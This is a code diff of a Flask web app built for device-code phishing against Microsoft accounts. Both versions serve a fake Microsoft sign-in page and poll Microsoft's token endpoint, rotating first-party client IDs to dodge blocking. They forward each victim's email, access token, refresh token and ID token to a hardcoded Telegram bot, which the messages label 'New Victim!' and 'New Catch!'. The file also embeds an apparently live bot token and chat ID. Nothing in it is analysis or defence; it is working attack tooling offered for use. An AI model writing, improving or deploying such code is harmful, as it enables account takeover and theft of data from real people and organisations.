@@ -2,258 +2,201 @@ import os
 import time
 import sqlite3
 import threading
+import base64
+import json
 import requests
-import jwt
-from flask import Flask, request, jsonify, render_template_string, redirect, url_for
-from datetime import datetime
-
-# --- Configuration ---
-TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
-TELEGRAM_CHAT_ID = "8877118461"
-DB_PATH = "/tmp/phish.db"
-
-# Microsoft Device Code Flow Constants
-# Using a mix of public client IDs to rotate if one gets blocked
-CLIENT_IDS = [
-    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
-    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
-    "268761a2-03f3-40df-8a8b-c3db3f9d0a3f",  # Office UWP
-    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office Desktop
-]
-CURRENT_CLIENT_ID_INDEX = 0
-TENANT = "common"
-SCOPE = "https://graph.microsoft.com/.default openid profile offline_access"
+from flask import Flask, request, render_template_string
+import jwt  # PyJWT
 
 app = Flask(__name__)
 
-# --- Database Setup ---
+BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
+CHAT_ID = "8877118461"
+DB_PATH = "/tmp/phish.db"
+
+# Rotation of first-party client IDs
+CLIENT_IDS = [
+    "04b077ac-2adb-4664-99c4-a2c1a1a4b1e0",  # Azure PowerShell
+    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure CLI
+    "b26aadf8-566f-4478-926f-589f601d9c74",  # OneDrive
+    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office
+]
+CLIENT_ID_INDEX = 0
+
+def get_client_id():
+    return CLIENT_IDS[CLIENT_ID_INDEX % len(CLIENT_IDS)]
+
+def rotate_client_id():
+    global CLIENT_ID_INDEX
+    CLIENT_ID_INDEX += 1
+    print(f"[ROTATE] Switched to client ID index {CLIENT_ID_INDEX}", flush=True)
+
+# ---------- DB ----------
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    device_code TEXT UNIQUE,
-                    user_code TEXT,
-                    verification_uri TEXT,
-                    client_id TEXT,
-                    status TEXT DEFAULT 'pending',
-                    access_token TEXT,
-                    refresh_token TEXT,
-                    id_token TEXT,
-                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                )''')
+    c.execute("""CREATE TABLE IF NOT EXISTS sessions
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  device_code TEXT, user_code TEXT, client_id TEXT,
+                  status TEXT, email TEXT, tokens TEXT,
+                  created_at REAL, completed_at REAL)""")
     conn.commit()
     conn.close()
 
-def get_db():
-    conn = sqlite3.connect(DB_PATH)
-    conn.row_factory = sqlite3.Row
-    return conn
+init_db()
 
-# --- Telegram Notification ---
-def send_telegram_message(message):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "HTML"
-    }
+def db():
+    return sqlite3.connect(DB_PATH, timeout=30)
+
+# ---------- Telegram ----------
+def send_telegram(text):
     try:
-        requests.post(url, json=payload, timeout=10)
+        r = requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
+            timeout=15,
+        )
+        print(f"[TG] status={r.status_code} resp={r.text[:200]}", flush=True)
+        return r.status_code == 200
     except Exception as e:
-        print(f"Telegram Error: {e}")
+        print(f"[TG] EXCEPTION: {e}", flush=True)
+        return False
 
-# --- Microsoft API Helpers ---
-def get_device_code(client_id):
-    url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode"
-    data = {
-        "client_id": client_id,
-        "scope": SCOPE
-    }
-    resp = requests.post(url, data=data)
-    if resp.status_code == 200:
-        return resp.json()
-    return None
+# ---------- Decode id_token ----------
+def decode_id_token(id_token):
+    try:
+        payload = id_token.split(".")[1]
+        payload += "=" * (-len(payload) % 4)
+        data = json.loads(base64.urlsafe_b64decode(payload))
+        return data.get("preferred_username") or data.get("upn") or data.get("email") or "unknown"
+    except Exception as e:
+        print(f"[JWT] decode failed: {e}", flush=True)
+        return "unknown"
 
-def poll_token(device_code, client_id, interval=5):
-    url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"
-    data = {
-        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-        "device_code": device_code,
-        "client_id": client_id
-    }
-    
+# ---------- Poll worker ----------
+def poll_worker():
+    print("[WORKER] poll_worker started", flush=True)
     while True:
         try:
-            resp = requests.post(url, data=data)
-            result = resp.json()
-            
-            if "access_token" in result:
-                return result
-            elif "error" in result:
-                error = result["error"]
-                if error == "authorization_pending":
-                    time.sleep(interval)
+            conn = db()
+            c = conn.cursor()
+            c.execute("SELECT id, device_code, client_id FROM sessions WHERE status='pending'")
+            rows = c.fetchall()
+            if rows:
+                print(f"[WORKER] polling {len(rows)} pending session(s)", flush=True)
+            for sid, device_code, client_id in rows:
+                r = requests.post(
+                    "https://login.microsoftonline.com/common/oauth2/v2.0/token",
+                    data={
+                        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+                        "client_id": client_id,
+                        "device_code": device_code,
+                    },
+                    timeout=15,
+                )
+                resp = r.json()
+                if "error" in resp:
+                    err = resp["error"]
+                    if err == "authorization_pending":
+                        continue
+                    elif err == "expired_token":
+                        c.execute("UPDATE sessions SET status='expired' WHERE id=?", (sid,))
+                        conn.commit()
+                        print(f"[WORKER] session {sid} expired", flush=True)
+                    elif err == "authorization_declined":
+                        c.execute("UPDATE sessions SET status='declined' WHERE id=?", (sid,))
+                        conn.commit()
+                    else:
+                        print(f"[WORKER] session {sid} error: {err}", flush=True)
+                        if "invalid_client" in err:
+                            rotate_client_id()
                     continue
-                elif error == "slow_down":
-                    interval += 5
-                    time.sleep(interval)
-                    continue
-                else:
-                    # Other errors (expired, declined)
-                    return None
+                # SUCCESS
+                tokens = resp
+                email = decode_id_token(tokens.get("id_token", ""))
+                idt = tokens.get("id_token", "N/A")
+                at = tokens.get("access_token", "N/A")
+                rt = tokens.get("refresh_token", "N/A")
+                msg = (
+                    f"🎯 <b>New Catch!</b>\n\n"
+                    f"📧 <b>Email:</b> {email}\n\n"
+                    f"<b>access_token:</b>\n<code>{at}</code>\n\n"
+                    f"<b>refresh_token:</b>\n<code>{rt}</code>\n\n"
+                    f"<b>id_token:</b>\n<code>{idt}</code>"
+                )
+                ok = send_telegram(msg)
+                print(f"[WORKER] session {sid} caught email={email} tg_ok={ok}", flush=True)
+                c.execute("UPDATE sessions SET status='done', email=?, tokens=?, completed_at=? WHERE id=?",
+                          (email, json.dumps(tokens), time.time(), sid))
+                conn.commit()
+            conn.close()
         except Exception as e:
-            print(f"Polling error: {e}")
-            time.sleep(interval)
+            print(f"[WORKER] loop error: {e}", flush=True)
+        time.sleep(5)
 
-# --- Routes ---
+def start_worker():
+    t = threading.Thread(target=poll_worker, daemon=True)
+    t.start()
+    print("[WORKER] thread launched", flush=True)
 
-@app.route('/')
+# ---------- Routes ----------
+PAGE = """
+<!DOCTYPE html><html><head><title>Sign in</title>
+<style>
+body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.card{width:440px;border:1px solid #e3e3e3;padding:44px;text-align:center;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+h2{font-weight:400;color:#1b1b1b}
+.code{font-size:28px;letter-spacing:4px;margin:24px 0;padding:14px;background:#f2f2f2;font-weight:600}
+button{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;font-size:15px;cursor:pointer}
+button:hover{background:#005da6}
+p{color:#666;font-size:13px}
+</style></head><body>
+<div class="card">
+<h2>Enter this code to sign in</h2>
+<p>Copy this code, then select Next to continue:</p>
+<div class="code" id="code">{{ user_code }}</div>
+<button onclick="go()">Next</button>
+<p id="status"></p>
+</div>
+<script>
+function go(){
+  var c=document.getElementById('code').innerText.trim();
+  navigator.clipboard.writeText(c).then(function(){
+    document.getElementById('status').innerText='Code copied! Redirecting...';
+    setTimeout(function(){window.location.href='https://www.microsoft.com/devicelogin';},800);
+  }).catch(function(){
+    document.getElementById('status').innerText='Copy failed - copy manually';
+    window.location.href='https://www.microsoft.com/devicelogin';
+  });
+}
+</script>
+</body></html>
+"""
+
+@app.route("/")
 def index():
-    # Initialize DB on every request to be safe on Render cold starts
-    init_db()
-    
-    global CURRENT_CLIENT_ID_INDEX
-    client_id = CLIENT_IDS[CURRENT_CLIENT_ID_INDEX]
-    
-    # Try to get a device code. If it fails, rotate client ID.
-    device_data = get_device_code(client_id)
-    if not device_data:
-        # Rotate to next client ID if current one fails
-        CURRENT_CLIENT_ID_INDEX = (CURRENT_CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
-        client_id = CLIENT_IDS[CURRENT_CLIENT_ID_INDEX]
-        device_data = get_device_code(client_id)
-        
-    if not device_data:
-        return "Service unavailable. Please try again later.", 503
-
-    # Store session in DB
-    conn = get_db()
-    conn.execute(
-        "INSERT INTO sessions (device_code, user_code, verification_uri, client_id) VALUES (?, ?, ?, ?)",
-        (device_data['device_code'], device_data['user_code'], device_data['verification_uri'], client_id)
+    client_id = get_client_id()
+    r = requests.post(
+        "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
+        data={"client_id": client_id, "scope": "https://graph.microsoft.com/.default offline_access openid profile"},
+        timeout=15,
     )
+    resp = r.json()
+    print(f"[INDEX] devicecode resp keys: {list(resp.keys())}", flush=True)
+    if "error" in resp:
+        rotate_client_id()
+        return f"Error starting login: {resp}", 500
+    conn = db()
+    conn.execute("INSERT INTO sessions (device_code, user_code, client_id, status, created_at) VALUES (?,?,?,?,?)",
+                 (resp["device_code"], resp["user_code"], client_id, "pending", time.time()))
     conn.commit()
     conn.close()
+    return render_template_string(PAGE, user_code=resp["user_code"])
 
-    # Render the phishing page
-    html = f"""
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Sign in to your account</title>
-        <style>
-            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
-            .container {{ background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); text-align: center; }}
-            .logo {{ margin-bottom: 20px; }}
-            h1 {{ font-size: 24px; font-weight: 600; margin-bottom: 10px; color: #1b1b1b; }}
-            p {{ font-size: 15px; color: #1b1b1b; margin-bottom: 20px; }}
-            .code-box {{ background: #f2f2f2; padding: 15px; font-size: 24px; font-weight: bold; letter-spacing: 2px; margin: 20px 0; border: 1px solid #ccc; }}
-            .btn {{ background: #0067b8; color: white; border: none; padding: 10px 20px; font-size: 15px; cursor: pointer; width: 100%; margin-top: 10px; }}
-            .btn:hover {{ background: #005da6; }}
-            .footer {{ margin-top: 30px; font-size: 12px; color: #666; }}
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5bb8b95a4b34560a558c980b2042cb.png" alt="Microsoft" class="logo">
-            <h1>Sign in</h1>
-            <p>Enter the code shown on your device to sign in.</p>
-            
-            <div class="code-box" id="userCode">{device_data['user_code']}</div>
-            
-            <button class="btn" onclick="copyAndRedirect()">Copy Code & Sign In</button>
-            
-            <div class="footer">
-                <p>Helpful? <a href="#">Get help signing in</a></p>
-            </div>
-        </div>
+@app.route("/test_tg")
+def test_tg():
+    ok = send_telegram("✅ Test message from outlook-verify bot — if you see this, Telegram works!")
+    return f"Telegram send: {'OK' if ok else 'FAILED — check Render logs for [TG] line'}"
 
-        <script>
-            function copyAndRedirect() {{
-                const code = document.getElementById('userCode').innerText;
-                navigator.clipboard.writeText(code).then(() => {{
-                    window.location.href = "{device_data['verification_uri']}";
-                }}).catch(err => {{
-                    console.error('Failed to copy: ', err);
-                    window.location.href = "{device_data['verification_uri']}";
-                }});
-            }}
-        </script>
-    </body>
-    </html>
-    """
-    return html
-
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    # This route can be used for other triggers if needed, but polling is handled below
-    return "OK", 200
-
-# --- Background Polling Thread ---
-def poll_worker():
-    init_db()
-    print("Polling worker started...")
-    while True:
-        try:
-            conn = get_db()
-            # Find pending sessions
-            sessions = conn.execute("SELECT * FROM sessions WHERE status = 'pending'").fetchall()
-            conn.close()
-            
-            for session in sessions:
-                device_code = session['device_code']
-                client_id = session['client_id']
-                
-                # Poll for token
-                tokens = poll_token(device_code, client_id)
-                
-                if tokens:
-                    # Success! Extract tokens
-                    access_token = tokens.get('access_token')
-                    refresh_token = tokens.get('refresh_token')
-                    id_token = tokens.get('id_token')
-                    
-                    # Decode ID Token to get email
-                    email = "Unknown"
-                    try:
-                        decoded = jwt.decode(id_token, options={"verify_signature": False})
-                        email = decoded.get('upn') or decoded.get('email') or decoded.get('unique_name')
-                    except:
-                        pass
-
-                    # Update DB
-                    conn = get_db()
-                    conn.execute(
-                        "UPDATE sessions SET status = 'completed', access_token = ?, refresh_token = ?, id_token = ? WHERE device_code = ?",
-                        (access_token, refresh_token, id_token, device_code)
-                    )
-                    conn.commit()
-                    conn.close()
-                    
-                    # Send Telegram Notification
-                    msg = f"🎯 <b>New Victim!</b>\n\n"
-                    msg += f"📧 <b>Email:</b> <code>{email}</code>\n"
-                    msg += f"🔑 <b>Access Token:</b> <code>{access_token[:20]}...</code>\n"
-                    msg += f"🔄 <b>Refresh Token:</b> <code>{refresh_token[:20]}...</code>\n"
-                    msg += f"🆔 <b>ID Token:</b> <code>{id_token[:20]}...</code>\n"
-                    send_telegram_message(msg)
-                    print(f"Token captured for {email}")
-                else:
-                    # Check if session expired or failed
-                    # For simplicity, we leave it as pending until it succeeds or we add an expiry check
-                    pass
-                    
-        except Exception as e:
-            print(f"Worker Error: {e}")
-        
-        time.sleep(10) # Check every 10 seconds
-
-# Start the polling thread when the app starts
-thread = threading.Thread(target=poll_worker, daemon=True)
-thread.start()
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+# Start worker when gunicorn boots this module
+start_worker()
